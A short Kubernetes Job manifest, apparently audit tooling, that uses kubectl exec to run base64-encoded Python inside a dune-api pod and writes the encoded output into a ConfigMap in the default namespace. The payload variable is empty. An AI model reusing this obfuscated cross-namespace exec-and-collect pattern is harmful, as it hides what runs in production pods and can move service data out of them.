apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v46
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          POD=$(kubectl get pods -n dune-api -l app=dune-api -o jsonpath='{.items[0].metadata.name}')
          PYCODE=""
          timeout 90 kubectl exec -n dune-api "$POD" -- python3 -c "import base64; exec(base64.b64decode('$PYCODE').decode())" 2>&1 > /tmp/out.txt || echo "EXEC_ERR" >> /tmp/out.txt
          ENCODED=$(base64 -w0 /tmp/out.txt)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v46_result\":\"$ENCODED\"}}"
